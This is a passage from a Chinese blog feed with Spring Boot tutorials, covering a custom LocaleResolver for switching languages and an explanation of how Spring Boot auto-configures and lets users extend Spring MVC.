&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>那假如我们现在想点击链接让我们的国际化资源生效，就需要让我们自己的Locale生效！</p><p>我们去自己写一个自己的LocaleResolver，可以在链接上携带区域信息！</p><p>修改一下前端页面的跳转连接：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 这里传入参数不需要使用 ？使用 （key=value）--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-sm&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/index.html(l=&#x27;zh_CN&#x27;)&#125;&quot;</span>&gt;</span>中文<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-sm&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/index.html(l=&#x27;en_US&#x27;)&#125;&quot;</span>&gt;</span>English<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>我们去写一个处理的组件类！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.component;<br><span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.LocaleResolver;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.util.Locale;<br><span class="hljs-comment">//可以在链接上携带区域信息</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyLocaleResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">LocaleResolver</span> </span>&#123;<br>    <span class="hljs-comment">//解析请求 </span><br>    <span class="hljs-meta">@Override</span>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Locale <span class="hljs-title">resolveLocale</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;<br>        String language = request.getParameter(<span class="hljs-string">&quot;l&quot;</span>);     <br>        Locale locale = Locale.getDefault(); <br>        <span class="hljs-comment">// 如果没有获取到就使用系统默认的     </span><br>        <span class="hljs-comment">//如果请求链接不为空     </span><br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(language))&#123;       <br>            <span class="hljs-comment">//分割请求参数     </span><br>            String[] split = language.split(<span class="hljs-string">&quot;_&quot;</span>);    <br>            <span class="hljs-comment">//国家，地区     </span><br>            locale = <span class="hljs-keyword">new</span> Locale(split[<span class="hljs-number">0</span>],split[<span class="hljs-number">1</span>]);     <br>        &#125;    <br>        <span class="hljs-keyword">return</span> locale;   <br>    &#125;<br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setLocale</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Locale locale)</span> </span>&#123;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>为了让我们的区域化信息能够生效，我们需要再配置一下这个组件！在我们自己的MvcConofig下添加bean；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Beanpublic</span> <br><span class="hljs-function">LocaleResolver <span class="hljs-title">localeResolver</span><span class="hljs-params">()</span></span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> MyLocaleResolver();<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>我们重启项目，来访问一下，发现点击按钮可以实现成功切换！搞定收工！</strong></p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MVC自动配置原理</title>
    <link href="/2021/04/12/SpringBoot/MVC%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86%20/"/>
    <url>/2021/04/12/SpringBoot/MVC%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86%20/</url>
    
    <content type="html"><![CDATA[<h1 id="MVC自动配置原理"><a href="#MVC自动配置原理" class="headerlink" title="MVC自动配置原理"></a>MVC自动配置原理</h1><h2 id="官网阅读"><a href="#官网阅读" class="headerlink" title="官网阅读"></a>官网阅读</h2><p>在进行项目编写前，我们还需要知道一个东西，就是SpringBoot对我们的SpringMVC还做了哪些配置，包括如何扩展，如何定制。</p><p>只有把这些都搞清楚了，我们在之后使用才会更加得心应手。途径一：源码分析，途径二：官方文档！</p><p>地址 ：<a href="https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/reference/htmlsingle/#boot-features-spring-mvc-auto-configuration">https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/reference/htmlsingle/#boot-features-spring-mvc-auto-configuration</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Spring MVC Auto-configuration<br><span class="hljs-comment">// Spring Boot为Spring MVC提供了自动配置，它可以很好地与大多数应用程序一起工作。</span><br>Spring Boot provides auto-configuration <span class="hljs-keyword">for</span> Spring MVC that works well with most applications.<br><span class="hljs-comment">// 自动配置在Spring默认设置的基础上添加了以下功能：</span><br>The auto-configuration adds the following features on top of Spring’s defaults:<br><span class="hljs-comment">// 包含视图解析器</span><br>Inclusion of ContentNegotiatingViewResolver and BeanNameViewResolver beans.<br><span class="hljs-comment">// 支持静态资源文件夹的路径，以及webjars</span><br>Support <span class="hljs-keyword">for</span> serving <span class="hljs-keyword">static</span> resources, including support <span class="hljs-keyword">for</span> WebJars <br><span class="hljs-comment">// 自动注册了Converter：</span><br><span class="hljs-comment">// 转换器，这就是我们网页提交数据到后台自动封装成为对象的东西，比如把&quot;1&quot;字符串自动转换为int类型</span><br><span class="hljs-comment">// Formatter：【格式化器，比如页面给我们了一个2019-8-10，它会给我们自动格式化为Date对象】</span><br>Automatic registration of Converter, GenericConverter, and Formatter beans.<br><span class="hljs-comment">// HttpMessageConverters</span><br><span class="hljs-comment">// SpringMVC用来转换Http请求和响应的的，比如我们要把一个User对象转换为JSON字符串，可以去看官网文档解释；</span><br><span class="hljs-function">Support <span class="hljs-keyword">for</span> <span class="hljs-title">HttpMessageConverters</span> <span class="hljs-params">(covered later in <span class="hljs-keyword">this</span> document)</span>.</span><br><span class="hljs-function"><span class="hljs-comment">// 定义错误代码生成规则的</span></span><br><span class="hljs-function">Automatic registration of <span class="hljs-title">MessageCodesResolver</span> <span class="hljs-params">(covered later in <span class="hljs-keyword">this</span> document)</span>.</span><br><span class="hljs-function"><span class="hljs-comment">// 首页定制</span></span><br><span class="hljs-function">Static index.html support.</span><br><span class="hljs-function"><span class="hljs-comment">// 图标定制</span></span><br><span class="hljs-function">Custom Favicon <span class="hljs-title">support</span> <span class="hljs-params">(covered later in <span class="hljs-keyword">this</span> document)</span>.</span><br><span class="hljs-function"><span class="hljs-comment">// 初始化数据绑定器：帮我们把请求数据绑定到JavaBean中！</span></span><br><span class="hljs-function">Automatic use of a ConfigurableWebBindingInitializer <span class="hljs-title">bean</span> <span class="hljs-params">(covered later in <span class="hljs-keyword">this</span> document)</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*</span></span><br><span class="hljs-comment"><span class="hljs-function">如果您希望保留Spring Boot MVC功能，并且希望添加其他MVC配置（拦截器、格式化程序、视图控制器和其他功能），则可以添加自己</span></span><br><span class="hljs-comment"><span class="hljs-function">的@configuration类，类型为webmvcconfiguer，但不添加@EnableWebMvc。如果希望提供</span></span><br><span class="hljs-comment"><span class="hljs-function">RequestMappingHandlerMapping、RequestMappingHandlerAdapter或ExceptionHandlerExceptionResolver的自定义</span></span><br><span class="hljs-comment"><span class="hljs-function">实例，则可以声明WebMVCregistrationAdapter实例来提供此类组件。</span></span><br><span class="hljs-comment"><span class="hljs-function">*/</span></span><br><span class="hljs-function">If you want to keep Spring Boot MVC features and you want to add additional MVC <span class="hljs-title">configuration</span> </span><br><span class="hljs-function"><span class="hljs-params">(interceptors, formatters, view controllers, and other features)</span>, you can add your own </span><br><span class="hljs-function">@Configuration class of type WebMvcConfigurer but without @EnableWebMvc. If you wish to provide </span><br><span class="hljs-function">custom instances of RequestMappingHandlerMapping, RequestMappingHandlerAdapter, or </span><br><span class="hljs-function">ExceptionHandlerExceptionResolver, you can declare a WebMvcRegistrationsAdapter instance to provide such components.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">// 如果您想完全控制Spring MVC，可以添加自己的@Configuration，并用@EnableWebMvc进行注释。</span></span><br><span class="hljs-function">If you want to take complete control of Spring MVC, you can add your own @Configuration annotated with @EnableWebMvc.</span><br></code></pre></div></td></tr></table></figure><p>我们来仔细对照，看一下它怎么实现的，它告诉我们SpringBoot已经帮我们自动配置好了SpringMVC，然后自动配置了哪些东西呢？</p><h2 id="ContentNegotiatingViewResolver-内容协商视图解析器"><a href="#ContentNegotiatingViewResolver-内容协商视图解析器" class="headerlink" title="ContentNegotiatingViewResolver 内容协商视图解析器"></a><strong>ContentNegotiatingViewResolver 内容协商视图解析器</strong></h2><p>自动配置了ViewResolver，就是我们之前学习的SpringMVC的视图解析器；</p><p>即根据方法的返回值取得视图对象（View），然后由视图对象决定如何渲染（转发，重定向）。</p><p>我们去看看这里的源码：我们找到 WebMvcAutoConfiguration ， 然后搜索ContentNegotiatingViewResolver。找到如下方法！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><span class="hljs-meta">@ConditionalOnBean(ViewResolver.class)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = &quot;viewResolver&quot;, value = ContentNegotiatingViewResolver.class)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> ContentNegotiatingViewResolver <span class="hljs-title">viewResolver</span><span class="hljs-params">(BeanFactory beanFactory)</span> </span>&#123;   <br>    ContentNegotiatingViewResolver resolver = <span class="hljs-keyword">new</span> ContentNegotiatingViewResolver();   <br>    resolver.setContentNegotiationManager(beanFactory.getBean(ContentNegotiationManager.class));   <br>    <span class="hljs-comment">// ContentNegotiatingViewResolver使用所有其他视图解析器来定位视图，因此它应该具有较高的优先级    </span><br>    resolver.setOrder(Ordered.HIGHEST_PRECEDENCE);  <br>    <span class="hljs-keyword">return</span> resolver;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们可以点进这类看看！找到对应的解析视图的代码；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><span class="hljs-comment">// 注解说明：@Nullable 即参数可为null</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String viewName, Locale locale)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;   <br>    RequestAttributes attrs = RequestContextHolder.getRequestAttributes();  <br>    Assert.state(attrs <span class="hljs-keyword">instanceof</span> ServletRequestAttributes, <span class="hljs-string">&quot;No current ServletRequestAttributes&quot;</span>);    <br>    List&lt;MediaType&gt; requestedMediaTypes = <span class="hljs-keyword">this</span>.getMediaTypes(((ServletRequestAttributes)attrs).getRequest());  <br>    <span class="hljs-keyword">if</span> (requestedMediaTypes != <span class="hljs-keyword">null</span>) &#123;       <br>        <span class="hljs-comment">// 获取候选的视图对象      </span><br>        List&lt;View&gt; candidateViews = <span class="hljs-keyword">this</span>.getCandidateViews(viewName, locale, requestedMediaTypes);  <br>        <span class="hljs-comment">// 选择一个最适合的视图对象，然后把这个对象返回    </span><br>        View bestView = <span class="hljs-keyword">this</span>.getBestView(candidateViews, requestedMediaTypes, attrs);    <br>        <span class="hljs-keyword">if</span> (bestView != <span class="hljs-keyword">null</span>) &#123;    <br>            <span class="hljs-keyword">return</span> bestView;  <br>        &#125;   <br>    &#125; <br>    <span class="hljs-comment">// .....</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们继续点进去看，他是怎么获得候选的视图的呢？</p><p>getCandidateViews中看到他是把所有的视图解析器拿来，进行while循环，挨个解析！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Iterator var5 = <span class="hljs-keyword">this</span>.viewResolvers.iterator();<br></code></pre></div></td></tr></table></figure><p>所以得出结论：<strong>ContentNegotiatingViewResolver 这个视图解析器就是用来组合所有的视图解析器的</strong> </p><p>我们再去研究下他的组合逻辑，看到有个属性viewResolvers，看看它是在哪里进行赋值的！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initServletContext</span><span class="hljs-params">(ServletContext servletContext)</span> </span>&#123;   <br>    <span class="hljs-comment">// 这里它是从beanFactory工具中获取容器中的所有视图解析器  </span><br>    <span class="hljs-comment">// ViewRescolver.class 把所有的视图解析器来组合的 </span><br>    Collection&lt;ViewResolver&gt; matchingBeans = BeanFactoryUtils.beansOfTypeIncludingAncestors(<span class="hljs-keyword">this</span>.obtainApplicationContext(), ViewResolver.class).values();   <br>    ViewResolver viewResolver;  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.viewResolvers == <span class="hljs-keyword">null</span>) &#123;  <br>        <span class="hljs-keyword">this</span>.viewResolvers = <span class="hljs-keyword">new</span> ArrayList(matchingBeans.size()); <br>    &#125;    <br>    <span class="hljs-comment">// ...............</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>既然它是在容器中去找视图解析器，我们是否可以猜想，我们就可以去实现一个视图解析器了呢？</p><p>我们可以自己给容器中去添加一个视图解析器；这个类就会帮我们自动的将它组合进来；<strong>我们去实现一下</strong></p><p>1、我们在我们的主程序中去写一个视图解析器来试试；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-comment">//放到bean中</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> ViewResolver <span class="hljs-title">myViewResolver</span><span class="hljs-params">()</span></span>&#123;    <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> MyViewResolver();<br>&#125;<br><span class="hljs-comment">//我们写一个静态内部类，视图解析器就需要实现ViewResolver接口</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyViewResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ViewResolver</span></span>&#123;   <br>    <span class="hljs-meta">@Override</span>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String s, Locale locale)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;  <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、怎么看我们自己写的视图解析器有没有起作用呢？</p><p>我们给 DispatcherServlet 中的 doDispatch方法 加个断点进行调试一下，因为所有的请求都会走到这个方法中</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp6QBbBv34R87hGpeWiaPnuYhBG1FlfdhtZxlIKicA2Y4kHy9XqRicibmQkWQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>3、我们启动我们的项目，然后随便访问一个页面，看一下Debug信息；</p><p>找到this</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp6NnU4IPDPs8jKYRjDJGia7t3C5YgjCSHuiaxlpthKpBwGh9m6icsF5zuow/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>找到视图解析器，我们看到我们自己定义的就在这里了；</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp67xW1M2s2aOnolP1tAedrqAtUuBHRjz7ALePedpHkpz9MXVyLwe6wYw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>所以说，我们如果想要使用自己定制化的东西，我们只需要给容器中添加这个组件就好了！剩下的事情SpringBoot就会帮我们做了！</p><h2 id="转换器和格式化器"><a href="#转换器和格式化器" class="headerlink" title="转换器和格式化器"></a>转换器和格式化器</h2><p>找到格式化转换器：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@Overridepublic</span><br><span class="hljs-function">FormattingConversionService <span class="hljs-title">mvcConversionService</span><span class="hljs-params">()</span> </span>&#123; <br>    <span class="hljs-comment">// 拿到配置文件中的格式化规则  </span><br>    WebConversionService conversionService =         <span class="hljs-keyword">new</span> WebConversionService(<span class="hljs-keyword">this</span>.mvcProperties.getDateFormat()); <br>    addFormatters(conversionService);  <br>    <span class="hljs-keyword">return</span> conversionService;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>点击去：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getDateFormat</span><span class="hljs-params">()</span> </span>&#123;   <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.dateFormat;<br>&#125;<br><span class="hljs-comment">/*** Date format to use. For instance, `dd/MM/yyyy`. 默认的 */</span><br><span class="hljs-keyword">private</span> String dateFormat;<br></code></pre></div></td></tr></table></figure><p>可以看到在我们的Properties文件中，我们可以进行自动配置它！</p><p>如果配置了自己的格式化方式，就会注册到Bean中生效，我们可以在配置文件中配置日期格式化的规则：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp6zdySrKJPkADN9jtsIpz6QPOyC2nI04l0EiaAOMuU47pwiaPq2RrhUdaA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>其余的就不一一举例了，大家可以下去多研究探讨即可！</p><h2 id="修改SpringBoot的默认配置"><a href="#修改SpringBoot的默认配置" class="headerlink" title="修改SpringBoot的默认配置"></a>修改SpringBoot的默认配置</h2><p>这么多的自动配置，原理都是一样的，通过这个WebMVC的自动配置原理分析，我们要学会一种学习方式，通过源码探究，得出结论；这个结论一定是属于自己的，而且一通百通。</p><p>SpringBoot的底层，大量用到了这些设计细节思想，所以，没事需要多阅读源码！得出结论；</p><p>SpringBoot在自动配置很多组件的时候，先看容器中有没有用户自己配置的（如果用户自己配置@bean），如果有就用用户配置的，如果没有就用自动配置的；</p><p>如果有些组件可以存在多个，比如我们的视图解析器，就将用户配置的和自己默认的组合起来！</p><p><strong>扩展使用SpringMVC</strong>  官方文档如下：</p><p>If you want to keep Spring Boot MVC features and you want to add additional MVC configuration (interceptors, formatters, view controllers, and other features), you can add your own @Configuration class of type WebMvcConfigurer but without @EnableWebMvc. If you wish to provide custom instances of RequestMappingHandlerMapping, RequestMappingHandlerAdapter, or ExceptionHandlerExceptionResolver, you can declare a WebMvcRegistrationsAdapter instance to provide such components.</p><p>我们要做的就是编写一个@Configuration注解类，并且类型要为WebMvcConfigurer，还不能标注@EnableWebMvc注解；我们去自己写一个；我们新建一个包叫config，写一个类MyMvcConfig；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//应为类型要求为WebMvcConfigurer，所以我们实现其接口</span><br><span class="hljs-comment">//可以使用自定义类扩展MVC的功能</span><br><span class="hljs-meta">@Configurationpublic</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyMvcConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addViewControllers</span><span class="hljs-params">(ViewControllerRegistry registry)</span></span><br><span class="hljs-function">    </span>&#123;       <br>        <span class="hljs-comment">// 浏览器发送/test ， 就会跳转到test页面；    </span><br>        registry.addViewController(<span class="hljs-string">&quot;/test&quot;</span>).setViewName(<span class="hljs-string">&quot;test&quot;</span>);   <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们去浏览器访问一下：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7Idia351qHgmH2vbzurk1Pp6smNnW3fpooPSQpiaoMajpXYGDoH0aQnv8awIibPa9eKkJhewdMrTtLTg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>确实也跳转过来了！所以说，我们要扩展SpringMVC，官方就推荐我们这么去使用，既保SpringBoot留所有的自动配置，也能用我们扩展的配置！</strong></p><p>我们可以去分析一下原理：</p><p>1、WebMvcAutoConfiguration 是 SpringMVC的自动配置类，里面有一个类WebMvcAutoConfigurationAdapter</p><p>2、这个类上有一个注解，在做其他自动配置时会导入：@Import(EnableWebMvcConfiguration.class)</p><p>3、我们点进EnableWebMvcConfiguration这个类看一下，它继承了一个父类：DelegatingWebMvcConfiguration</p><p>这个父类中有这样一段代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DelegatingWebMvcConfiguration</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WebMvcConfigurationSupport</span> </span>&#123;   <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> WebMvcConfigurerComposite configurers = <span class="hljs-keyword">new</span> WebMvcConfigurerComposite();  <br>    <span class="hljs-comment">// 从容器中获取所有的webmvcConfigurer</span><br>    <span class="hljs-meta">@Autowired(required = false)</span>  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setConfigurers</span><span class="hljs-params">(List&lt;WebMvcConfigurer&gt; configurers)</span> </span>&#123;    <br>        <span class="hljs-keyword">if</span> (!CollectionUtils.isEmpty(configurers)) &#123;      <br>            <span class="hljs-keyword">this</span>.configurers.addWebMvcConfigurers(configurers); <br>        &#125;   <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>4、我们可以在这个类中去寻找一个我们刚才设置的viewController当做参考，发现它调用了一个</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addViewControllers</span><span class="hljs-params">(ViewControllerRegistry registry)</span> </span>&#123;  <br>    <span class="hljs-keyword">this</span>.configurers.addViewControllers(registry);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>5、我们点进去看一下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addViewControllers</span><span class="hljs-params">(ViewControllerRegistry registry)</span> </span>&#123; <br>    Iterator var2 = <span class="hljs-keyword">this</span>.delegates.iterator();<br>    <span class="hljs-keyword">while</span>(var2.hasNext()) &#123;       <br>        <span class="hljs-comment">// 将所有的WebMvcConfigurer相关配置来一起调用！包括我们自己配置的和Spring给我们配置的   </span><br>        WebMvcConfigurer delegate = (WebMvcConfigurer)var2.next();     <br>        delegate.addViewControllers(registry);  <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>所以得出结论：所有的WebMvcConfiguration都会被作用，不止Spring自己的配置类，我们自己的配置类当然也会被调用；</p><h2 id="全面接管SpringMVC"><a href="#全面接管SpringMVC" class="headerlink" title="全面接管SpringMVC"></a>全面接管SpringMVC</h2><p>官方文档：</p><figure class="highlight autoit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autoit"><span class="hljs-keyword">If</span> you want <span class="hljs-keyword">to</span> take complete control of Spring MVCyou can add your own <span class="hljs-symbol">@Configuration</span> annotated <span class="hljs-keyword">with</span> <span 